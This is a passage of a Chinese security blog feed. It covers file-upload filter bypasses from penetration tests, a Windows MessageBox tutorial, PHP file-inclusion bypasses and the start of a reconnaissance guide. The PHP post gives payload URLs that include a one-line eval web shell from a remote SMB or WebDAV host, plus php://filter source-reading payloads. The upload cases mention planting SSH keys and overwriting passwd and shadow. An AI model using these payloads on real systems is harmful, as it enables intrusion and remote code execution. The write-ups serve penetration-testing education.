    <content type="html"><![CDATA[<h1 id="案例一"><a href="#案例一" class="headerlink" title="案例一"></a>案例一</h1><p>一次项目渗透时，通过往png后缀随便加个字符可知该上传点为白名单上传，正常情况下无法绕过</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1671284727.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/1.png" alt="img"></a></p><p>通过观察接口信息，发现接口名字为UploadImg，猜测该接口用于图片上传，按照开发的习惯，保不准会存在temp、test，这类的接口，随后通过fuzz找到存在的上传接口（file），但此时的接口（file）上传文件仍旧存在限制，需要绕过。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3472946638.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/2.png" alt="img"></a></p><p>由于黑名单限制不够严谨，经过多个伪后缀尝试，发现.cer后缀可绕过限制并被解析</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1665683640.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/3.png" alt="img"></a></p><p>然后就getshell进内网，后面的操作就不多说了。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2197535020.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/4.png" alt="img"></a></p><p>但并非往png后加个特殊字符能认为它是白名单不能进行绕过了，下面举个例子：</p><p>看到这种情况估计不少师傅都会认为后端做了白名单限制上传了吧，接着往下看，怎么去绕过它。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/926208312.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/5.png" alt="img"></a></p><p>错误回显提示了只能上传ppt/pptx/doc/docx/xls/xlsx/rar/jpg/png类型，但在后续的测试中，发现了types类型可控，且在存在多个后缀的情况下，后端只保留最后一个后缀，并重命名文件，所以只要上传后缀包含了白名单限制内的类型即可绕过，如（test.png.jsp），只会保留.jsp后缀，如下：</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1433005059.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/6.png" alt="img"></a></p><p>很多师傅看到白名单上传就会认为这个上传点足够安全，无法绕过，但其实不然，在存在多个上传接口的情况下，或许会存在没做限制，或者限制不严格的上传点也不一定，关键的是我们要如何发现这些接口，在此类接口存在限制时，如何去进行绕过，下面再举一个和接口绕过相关的例子。</p><h1 id="案例二"><a href="#案例二" class="headerlink" title="案例二"></a>案例二</h1><p>upload_2018.php接口白名单上传，在正常情况下，改变后缀会导致上传失败，如下</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3368800734.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/7.png" alt="img"></a></p><p>再进一步测试时发现存在多个上传接口，删除_2018使用upload接口进行文件上传，可导致任意文件上传</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1423244665.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/8.png" alt="img"></a></p><p>进一步传shell时发现存在waf（某讯云)，需进一步绕过。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2367732524.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/9.png" alt="img"></a></p><p>通过寻找域名真实IP，使用真实IP进行文件上传，绕过waf限制，为防止有心人，这里直接把IP给打码盖住了，以防万一。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/217557312.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/10.png" alt="img"></a></p><p>很多时候有一些开发为了便捷性，在部署上传接口时限制不够严谨或压根没做限制，这导致一旦被绕过限制传shell，都会导致非常严重的后果，当然，我们可以找一些temp、test这类上传接口，因为此类接口多数是开发过程中用作测试的，这种接口几乎都是无限上传文件类型的，同样的我们也可以找一些api文档进行上传接口的发现，这或许会有惊喜也说不定，之前写过关于接口测试类的安全文章，可参考<a href="https://blog.m1kh.com/index.php/archives/403/">关于Swagger-UI下的渗透实战</a></p><h1 id="案例三"><a href="#案例三" class="headerlink" title="案例三"></a>案例三</h1><p>这是一个把图片转base64的文件上传类型，具体绕过如下：</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3774740521.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/11.png" alt="img"></a></p><p>通过抓包发现图片是以base64进行上传的，观察了下数据包，发现可通过更改upload_0字段内容上传任意文件</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2617396617.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/12.png" alt="img"></a></p><p>访问HTML页面，成功被解析，可进一步上传shell获取权限。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2627957224.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/13.png" alt="img"></a></p><p>一句话shell上传后发现无法执行命令，之后通过上传PHPinfo发现其存在disable_functions，利用某斯拉绕过限制，getshell</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1873642010.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/14.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3820787191.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/15.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2700789588.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/16.png" alt="img"></a></p><h1 id="案例四"><a href="#案例四" class="headerlink" title="案例四"></a>案例四</h1><p>一个关于nginx解析漏洞的利用，这个漏洞是很久之前挖到的，这种漏洞现在应该不会存在了，单单是waf都能栏掉，这个就作为思路开拓说一下：</p><p>一次外网打点时发现了目标的一个核心系统，通过踩点发现了某上传功能，但上传接口存在白名单限制，且无其它的上传接口，由于这个站的shell比较重要，必须拿到，之后通过漏洞挖掘，发现目标存在nginx解析漏洞，结合图片上传点成功获取到了内网据点。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3593419550.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/17.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1979989394.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/18.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3605815075.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/19.png" alt="img"></a></p><h1 id="案例五"><a href="#案例五" class="headerlink" title="案例五"></a>案例五</h1><p>某次攻防踩点目标时发现了一个上传点，且在信息收集时发现了该目标存在内网环境，进一步想利用该功能点上传shell时却发现存在阻碍，通过fuzz后，发现可用空格绕过限制，最终利用该功能缺陷get shell进内网。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3988320782.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/20.png" alt="img"></a></p><p>正常上传.jsp后缀失败，尝试大小写、脏数据填充等也均失败。<br><a href="https://blog.m1kh.com/usr/uploads/2021/06/1628136031.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/21.png" alt="img"></a></p><p>之后留着shell内容不动，更改.jsp后缀为.png，发现可上传成功，由此判断后端不对上传内容做检测，再进一步测试时，发现可利用空格绕过限制上传shell，然后通过读取MSSQL密码，发现内网密码存在规律，最终通过该密码规律内网横向获取到了大量内网机器权限。<br><a href="https://blog.m1kh.com/usr/uploads/2021/06/2309134994.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/22.png" alt="img"></a><br><a href="https://blog.m1kh.com/usr/uploads/2021/06/4116338990.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/23.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3890187884.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/24.png" alt="img"></a></p><h1 id="案例六"><a href="#案例六" class="headerlink" title="案例六"></a>案例六</h1><p>一次项目测试中发现了一个上传点，但waf拦截jsp、html等后缀，更改后缀重放数据包会导致reset，如下：<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/3831654627.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/25.png" alt="img"></a></p><p>进一步测试发现fileName和fileType参数可控，且当存在两个不同的后缀时，最上层的filename参数优先级为最高，可导致任意文件上传<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/2073748874.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/26.png" alt="img"></a></p><p>发现上传成功的jsp文件其回显的type类型为image/png类型<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/2634279959.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/27.png" alt="img"></a></p><p>删除最下层filename的Content-Type: image/png，文件上传类型即可被绕过<br><a href="https://blog.m1kh.com/usr/uploads/2021/07/3945470191.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/28.png" alt="img"></a></p><h1 id="其它场景-amp-总结"><a href="#其它场景-amp-总结" class="headerlink" title="其它场景&amp;总结"></a>其它场景&amp;总结</h1><p>有些时候文件上传成功后端没有返回路径，只回显了一个id号，这时候如果目标存在注入的话，我们可尝试用sqlmap的–search参数或者SQLshell对返回的ID号进行搜索，这样说不定就能找到shell地址了，之前在<a href="https://blog.m1kh.com/index.php/archives/403/">关于Swagger-UI下的渗透实战</a>也说过，感兴趣的可以去看看；也有文件上传成功却只回显一个文件名的，在前不久的一次攻防就遇到这种情况，后来是用了fuzz找到了完整的shell路径，另外在某些时候，上传文件可以跨目录，那么我们可以通过../进行跨目录上传，运气好的话，或许会在几个../后把shell传到域名的根目录下，如果当前上传文件夹无执行权限，那么跨目录上传shell也是个不错的思路；另外，如果上传目录可控，可上传文件到任意目录的话，在linux场景我们可上传一个ssh秘钥用于远程登录，极端一点的话，可考虑上传passwd、shadow文件覆盖系统用户，但前提是权限要足够大。</p><p>如果不能跨目录，站点又没有注入的话，那么我们可以尝试寻找网站日志文件，例如泛微E-COLOGY日志的日志，像这种日志文件是有规律可循的，可以用burp进行日志爆破，或许在日志文件中能找到shell路径也说不定，如果在日志中没有发现shell地址，那么可进一步观察日志里的文件路径，诸如upload，filepath这类路径，举一反三，可对这些路径fuzz shell地址。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1978765052.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/29.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/1078504168.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/30.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/2406307994.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/31.png" alt="img"></a></p><p>再者就是文件包含和文件读取了，文件读取的话可以通过读取日志和配置文件来发现shell地址，但是成功率太低了，至于文件包含，除了靶场和ctf，实战还没碰过。</p><p>还有一个关于burp的使用技巧，这是真实遇到的，上传shell后没有回显路径，但是通过http history搜索shell的名字发现了完整的shell路径，因为传上去的文件，如图片这类的总归是显示出来的，这时候可以先在web应用到处点点，多加载一些数据包，然后再到http history搜索shell的名字，或许会有惊喜也说不定。</p><p>另外要细心点观察上传数据包，或许改一下字段就可以绕过了，例如crc32这类校验。<br><a href="https://blog.m1kh.com/usr/uploads/2021/06/3815842614.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/32.png" alt="img"></a></p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/43265324.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/33.png" alt="img"></a></p><p>某些时候上传黑名单不严谨，那么我们可用伪后缀进行绕过，其它多的就不说了，大概思路就这样，当绕过限制拿到shell时，总会给我带来乐趣，或许这就是我喜欢渗透的原因。</p><p><a href="https://blog.m1kh.com/usr/uploads/2021/06/3011390688.png"><img src="/2021/08/23/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF%E6%8B%93%E5%B1%95/34.png" alt="img"></a></p><p>文章来自：m1kh师傅 <a href="https://blog.m1kh.com/">https://blog.m1kh.com/</a> </p>]]></content>
    
    
    <categories>
      
      <category>文件上传</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>从控制台到窗口程序</title>
    <link href="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/"/>
    <url>/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/</url>
    
    <content type="html"><![CDATA[<h2 id="从控制台到窗口程序"><a href="#从控制台到窗口程序" class="headerlink" title="从控制台到窗口程序"></a>从控制台到窗口程序</h2><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/1.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/2.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/3.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/4.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/5.png" alt="1"></p><blockquote><p>如果不知道函数什么意思 直接选中函数 然后按F1  可以直接打开文档</p></blockquote><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/6.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/7.png" alt="1"></p><blockquote><p>直接按F1  查看参数配置</p></blockquote><blockquote><p>MessageBox  消息框函数：</p></blockquote><blockquote><p>显示一个模式对话框，其中包含一个系统图标、一组按钮和一条特定于应用程序的简短消息，例如状态或错误信息。</p></blockquote><blockquote><p>消息框返回一个整数值，指示用户单击了哪个按钮。</p></blockquote><p><strong>语法：</strong></p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-built_in">int</span> MessageBox(<br>  <span class="hljs-built_in">HWND</span>    <span class="hljs-built_in">hWnd</span>,<br>  LPCTSTR lpText,<br>  LPCTSTR lpCaption,<br>  UINT    uType<br>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p><strong>参数：</strong></p><ul><li>hWnd</li></ul><p>类型：<strong>HWND</strong></p><p>要创建的消息框的所有者窗口的句柄。如果此参数为<strong>NULL</strong>，则消息框没有所有者窗口。</p><ul><li>lpText</li></ul><p>类型：<strong>LPCTSTR</strong></p><p>要显示的消息。如果字符串由多行组成，您可以在每行之间使用回车符和/或换行符分隔各行。</p><ul><li>lpCaption</li></ul><p>类型：<strong>LPCTSTR</strong></p><p>对话框标题。如果此参数为<strong>NULL</strong>，则默认标题为<strong>Error</strong>。</p><ul><li>uType</li></ul><p>类型：<strong>UINT</strong></p><p>对话框的内容和行为。此参数可以是来自以下标志组的标志的组合。</p><p>要指示消息框中显示的按钮，请指定以下值之一。</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/8.png" alt="1"></p><p>要在消息框中显示图标，请指定以下值之一。</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/9.png" alt="1"></p><p>其他的可以查文档</p><p><strong>返回值：</strong></p><p>类型：<strong>int</strong></p><p>如果一个消息框有一个<strong>取消</strong>按钮，则该函数返回<strong>IDCANCEL</strong>如果或者ESC键被按下或值<strong>取消</strong>按钮被选择。</p><p>如果消息框没有<strong>取消</strong>按钮，则按 ESC 将不起作用 - 除非存在 MB_OK 按钮。</p><p>如果显示 MB_OK 按钮并且用户按下 ESC，则返回值将为<strong>IDOK</strong>。</p><p>如果函数失败，则返回值为零。要获取扩展错误信息，请调用<a href="https://docs.microsoft.com/en-us/windows/desktop/api/errhandlingapi/nf-errhandlingapi-getlasterror">GetLastError</a>。</p><p>如果函数成功，则返回值是以下菜单项值之一。</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/10.png" alt="1"></p><blockquote><p>但是这样直接执行是会报错的 因为创建项目的时候 选择的是控制台输出</p></blockquote><blockquote><p>所以需要调整</p></blockquote><blockquote><p>先右键点击项目 点属性</p></blockquote><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/11.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/12.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/13.png" alt="1"></p><p>将控制台换成窗口</p><p>成功执行</p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/14.png" alt="1"></p><blockquote><p>为什么hello word前面要加L   因为  创建项目的时候 默认是使用的WCHAR类型的字符集  不加L的话 使用的就CHAR类型的   不匹配 就会报错</p></blockquote><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/15.png" alt="1"></p><p><img src="/2021/08/21/Windows%E7%BC%96%E7%A8%8B1/16.png" alt="1"></p>]]></content>
    
    
    <categories>
      
      <category>Windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Windows</tag>
      
      <tag>C++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php文件包含漏洞（allow_url_include=Off）的绕过方法</title>
    <link href="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/"/>
    <url>/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>分享几个当allow_url_include = Off时的文件包含漏洞的绕过方法。</p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/1.png" alt="1"></p><p>假设服务端的php代码（aaa.php）如下图所示：</p><h2 id="第1种：smb协议"><a href="#第1种：smb协议" class="headerlink" title="第1种：smb协议"></a><strong>第1种：smb协议</strong></h2><p>Payload：<a href="http://127.0.0.1/aaa.php?path=%5C%5C43.5*.**.74%5Cica%5Cabc1238.htm">http://127.0.0.1/aaa.php?path=\\43.5*.**.74\ica\abc1238.htm</a></p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/2.png" alt="2"></p><p>这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器.</p><p>首先在VPS上搭建Samba服务，然后添加一个无需认证即可访问的共享目录，配置信息如下图所示：</p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/3.png" alt="3"></p><p>然后在/home/share目录创建abc1238.htm文件，文件内容为：<font color="red"><?php phpinfo();?></font></p><p>最后启动Samba服务，访问<a href="http://127.0.0.1/aaa.php?path=%5C%5C43.5*.**.74%5Cica%5Cabc1238.htm%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87allow_url_include">http://127.0.0.1/aaa.php?path=\\43.5*.**.74\ica\abc1238.htm即可绕过allow_url_include</a> = Off的限制GetShell。</p><h2 id="第2种：WebDAV"><a href="#第2种：WebDAV" class="headerlink" title="第2种：WebDAV"></a><strong>第2种：WebDAV</strong></h2><p>Payload：<a href="http://127.0.0.1/aaa.php?path=%5C%5C36.*8.**.74%5Cwebdav%5Ccode.htm&amp;cmd=phpinfo()">http://127.0.0.1/aaa.php?path=\\36.*8.**.74\webdav\code.htm&amp;cmd=phpinfo()</a>;</p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/4.png" alt="4"></p><p>这种方法只适用于Windows类型的网站服务器，不能用于Linux服务器。</p><p>首先在VPS上搭建WebDAV环境，我是基于Ubuntu+Apache httpd搭建的WebDAV环境。</p><p>然后在WebDAV目录下创建code.htm文件，文件内容为：<font color="red"><?php eval($_GET['cmd']);?></font></p><p>最后启动Apache httpd服务器，访问<a href="http://127.0.0.1/aaa.php?path=%5C%5C36.*8.**.74%5Cwebdav%5Ccode.htm&amp;cmd=phpinfo();%E5%8D%B3%E5%8F%AF%E7%BB%95%E8%BF%87allow_url_include">http://127.0.0.1/aaa.php?path=\\36.*8.**.74\webdav\code.htm&amp;cmd=phpinfo();即可绕过allow_url_include</a> = Off的限制GetShell。</p><h2 id="第3种：php-filter"><a href="#第3种：php-filter" class="headerlink" title="第3种：php://filter/"></a><strong>第3种：php://filter/</strong></h2><p>利用php://filter/不能直接GetShell，但可以读取网站php代码文件，然后进行代码分析。或读取网站配置文件等其他重要文件。</p><p>Payload：</p><p><font color="red"><a href="http://127.0.0.1/aaa.php?path=php://filter/read=convert.base64-encode/resource=D:/phpStudy/WWW/index.php">http://127.0.0.1/aaa.php?path=php://filter/read=convert.base64-encode/resource=D:/phpStudy/WWW/index.php</a></font></p><p><font color="red"><a href="http://192.168.56.130/aaa.php?path=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php">http://192.168.56.130/aaa.php?path=php://filter/read=convert.base64-encode/resource=/var/www/html/index.php</a></font></p><p><img src="/2021/08/21/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%EF%BC%88allow-url-include-Off%EF%BC%89%E7%9A%84%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95/5.png" alt="5"></p><p>执行上述Payload会将D:/phpStudy/WWW/drupal-7.54/index.php文件以base64编码形式返回。</p><p>这种方法在Linux和Windows服务器都可以。</p><p>附带参考链接：</p><p><a href="https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx">https://helpcenter.onlyoffice.com/server/community/connect-webdav-server-ubuntu.aspx</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/include_file.html">https://www.cnblogs.com/iamstudy/articles/include_file.html</a></p><p><a href="https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/10/08/php%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a></p><p><a href="http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html">http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html</a></p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
      <tag>PHP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>信息收集</title>
    <link href="/2021/05/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    <url>/2021/05/17/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>信息收集是渗透最重要的阶段，通过一系列的操作尽可能多的收集到多的目标的各种信息，只有先收集到多的信息之后才有利于后续的渗透。</p><h2 id="信息收集方式"><a href="#信息收集方式" class="headerlink" title="信息收集方式"></a>信息收集方式</h2><h3 id="主动收集："><a href="#主动收集：" class="headerlink" title="主动收集："></a>主动收集：</h3><p>与目标主机进行直接交互，从而拿到目标信息，缺点是会记录自己的操作信息</p><h3 id="被动收集："><a href="#被动收集：" class="headerlink" title="被动收集："></a>被动收集：</h3><p>不与目标主机进行直接交互，通过搜索引擎或者社会工程等方式间接的获取目标主机的信息</p><h2 id="一、收集域名信息"><a href="#一、收集域名信息" class="headerlink" title="一、收集域名信息"></a>一、收集域名信息</h2><p>知道目标的域名之后，我们要做的第一件事就是获取域名的注册信息，包括<br>域名 DNS 务器信息和注册人的联系信息等。<br><strong>域名信息收集</strong>的常用方法有以下这几种：</p><h3 id="1-whois查询"><a href="#1-whois查询" class="headerlink" title="1.whois查询"></a>1.whois查询</h3><ul><li>用来查询域名是否已经被注册，以及注册域名的详细信息的数据库（如域名所有人、域名注册商）。</li><li>Whois查询我们主要关注的重点是注册商、注册人、邮件、DNS解析服务器、注册人联系电话。</li><li>whois信息在线收集地址<br>站长之家： <a href="http://whois.chinaz.com/">http://whois.chinaz.com/</a><br>阿里云域名信息查询：<a href="https://whois.aliyun.com/">https://whois.aliyun.com</a><br>爱站：<a href="https://whois.aizhan.com/">https://whois.aizhan.com/</a><br>微步：<a href="https://x.threatbook.cn/">https://x.threatbook.cn/</a></li><li>whois反查<br>站长之家：<a href="http://whois.chinaz.com/">http://whois.chinaz.com</a><br>whois反查可根据whois获取到的域名所有人、域名注册商、域名注册日期和过期日期等,使用邮箱，电话等进行反查获取更多关联的域名等信息</li></ul><h3 id="2-备案信息查询"><a href="#2-备案信息查询" class="headerlink" 